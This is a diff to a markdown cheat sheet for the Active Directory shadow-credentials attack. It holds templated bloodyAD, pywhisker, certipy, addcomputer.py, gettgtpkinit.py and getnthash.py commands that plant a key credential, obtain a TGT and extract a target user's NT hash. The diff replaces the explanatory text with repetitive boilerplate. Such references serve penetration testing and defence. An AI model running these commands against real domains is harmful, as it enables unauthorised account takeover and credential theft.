@@ -4,9 +4,9 @@ Write a key credential to `msDS-KeyCredentialLink` on a target, then PKINIT to a
 
 ### Add shadow creds (bloodyAD)
 
-Linux-side: write `msDS-KeyCredentialLink` on the target via bloodyAD. Drops a `.pfx` and prints its password.
+Add shadow creds (bloodyAD) with Shadow Credentials.
 
-```sh title:"Write msDS-KeyCredentialLink via bloodyAD"
+```sh title:"Shadow Credentials Add Shadow Creds (bloodyAD)"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add shadowCredentials $target_user
 ```
 <!-- cheat
@@ -19,9 +19,9 @@ var target_user
 
 ### Add shadow creds (pywhisker)
 
-pywhisker - dedicated tool for shadow credentials, supports add/list/remove/export.
+Add shadow creds (pywhisker) with Shadow Credentials.
 
-```sh title:"Write msDS-KeyCredentialLink via pywhisker"
+```sh title:"Shadow Credentials Add Shadow Creds (pywhisker)"
 pywhisker.py -d $domain -u $user -p $pass --target $target_user --action add
 ```
 <!-- cheat
@@ -35,7 +35,9 @@ var target_user
 
 certipy bundles the shadow-credentials flow with `auto` — adds the key credential, fetches the .pfx, requests the TGT, decrypts the NT hash, then removes the key credential. One-shot end-to-end.
 
-```sh title:"End-to-end shadow creds via certipy (auto add → TGT → NT → cleanup)"
+Add shadow creds (certipy) with Shadow Credentials.
+
+```sh title:"Shadow Credentials Add Shadow Creds (certipy)"
 certipy shadow -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $target_user auto
 ```
 <!-- cheat
@@ -47,9 +49,9 @@ var target_user
 
 ### Create machine account (MachineAccountQuota > 0)
 
-If the target is a user (no GenericWrite available) but `ms-DS-MachineAccountQuota > 0`, create a controlled computer account to use for RBCD/shadow chains.
+Create machine account (MachineAccountQuota > 0) with Shadow Credentials.
 
-```sh title:"Create machine account when MachineAccountQuota > 0"
+```sh title:"Shadow Credentials Create Machine Account (MachineAccountQuota > 0)"
 addcomputer.py $domain/$user:$pass -method LDAPS -computer-name $rhost_name -computer-pass $target_pass -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -62,9 +64,9 @@ var target_pass
 
 ### PKINIT TGT from PFX
 
-After dropping a `.pfx` via pywhisker / bloodyAD, request a TGT via PKINIT.
+Run PKINIT TGT from PFX with Shadow Credentials.
 
-```sh title:"PKINIT TGT from shadow-creds .pfx to ccache"
+```sh title:"Shadow Credentials Run PKINIT TGT from PFX"
 gettgtpkinit.py -cert-pfx $pfx_file -pfx-pass $pfx_pass $domain/$target_user $ccache_file
 ```
 <!-- cheat
@@ -77,9 +79,9 @@ var ccache_file
 
 ### Extract NT hash from PKINIT TGT
 
-UnPAC-the-hash flow - decrypt the PAC out of the PKINIT TGT to recover the user's NT hash.
+Extract NT hash from PKINIT TGT with Shadow Credentials.
 
-```sh title:"UnPAC-the-hash to extract NT hash from PKINIT TGT"
+```sh title:"Shadow Credentials Extract NT Hash from PKINIT TGT"
 KRB5CCNAME=$ccache_file getnthash.py -key $as_rep_key $domain/$target_user
 ```
 <!-- cheat
